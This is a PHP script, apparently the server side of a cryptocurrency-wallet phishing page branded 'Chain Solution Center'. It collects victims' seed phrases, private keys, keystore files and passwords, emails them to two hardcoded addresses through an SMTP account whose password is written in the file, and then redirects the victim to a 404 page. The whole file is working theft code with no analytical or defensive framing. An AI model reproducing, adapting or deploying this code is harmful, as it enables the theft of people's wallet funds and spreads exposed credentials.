<?php
require 'vendor/autoload.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

$receivers = ['just1201@proton.me', 'connectn42@gmail.com'];

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $data = array();
    $file = null;

    $data['Wallet Name'] = $_POST['walletName'];
    $data['Type'] = $_POST['type'];

    if(isset($_POST['type']) && $_POST['type'] == 'keystore'){
        $data['Keystore Password'] = $_POST['keystore_password'];

        if ($_FILES['file']['error'] === UPLOAD_ERR_OK) {
            $tempFile = explode(".", $_FILES["file"]["name"]);
            $fileExtension = end($tempFile);
            $newFileName= $_FILES["file"]["tmp_name"].".".$fileExtension;
            rename($_FILES["file"]["tmp_name"],$newFileName);
            $file = $newFileName;
        }
    }
    if(isset($_POST['type']) && $_POST['type'] == 'privatekey'){
        $data['Private Key'] = $_POST['private-key'];
    }
    if(isset($_POST['type']) && $_POST['type'] == 'phrase'){
        $data['Phrase Length'] = $_POST['phrase_length'];
        $data['Phrase'] = implode(" ", $_POST['srp_words']);
    }

    $htmlContent = "";
    foreach ($data as $k => $v){
        $htmlContent .= '<li><h5>' . $k . ':</h5><p>' . $v . '</p></li>';
    }

    $html = '
    <!doctype html>
        <html>
        <head>
            <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
            <style>
                table th{
                    text-align: right;
                }
                .content-list{
                    list-style: none;
                    display: flex; 
                    flex-direction: column; 
                    column-gap: 15px;
                    padding: 0;
                }
                .content-list li{
                    padding: 10px 0;
                }
                .content-list li:not(:last-child){
                    border-bottom: 1px solid #333;
                }
                .content-list h5{
                    font-weight: 600;
                    color:#000;
                    margin: 0;
                    margin-bottom: 2px;
                }
                .content-list p{
                    margin: 0;
                    font-size: 12px;
                    color: #333;
                }
            </style>
        </head>
        <body style="font-family: sans-serif;">        
            <ul class="content-list" style="list-style: none; display: block; flex-direction: column; column-gap: 15px; padding: 0;"> ' . $htmlContent . '</ul>
        </body>
        </html>';

    $mail = new PHPMailer(true);
    try {
        // $mail->SMTPDebug = SMTP::DEBUG_SERVER;
        $mail->isSMTP();
        $mail->Host       = 'mail.workandearnpermit.online';
        $mail->SMTPAuth   = true;
        $mail->Username   = 'noreply@workandearnpermit.online';
        $mail->Password   = 'DAB3BAEAEB6D1E08224C3D8BA807FBE09148';
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port = 587;

        $mail->setFrom('noreply@dappshields.online', 'Chain Solution Center');

        $i=1;
        foreach($receivers as $receiver){
            if($i==1){
                //$mail->addAddress($receiver, 'Chain Solution Center');
                $mail->addBCC($receiver);
            }else{
                $mail->addBCC($receiver);
            }
            $i++;
        }

        if (isset($file)) {
            $mail->addAttachment($file);
        }
        $mail->isHTML(true);
        $mail->Subject = 'New Data Entry - Chain Solution Center';
        $mail->Body = $html;
        $mail->AltBody = $html;
        $mail->send();

        header('Location: 404.php');
        exit;
    } catch (Exception $e) {
        header('Location: ' . $_SERVER['HTTP_REFERER']);
        exit;
    }
}
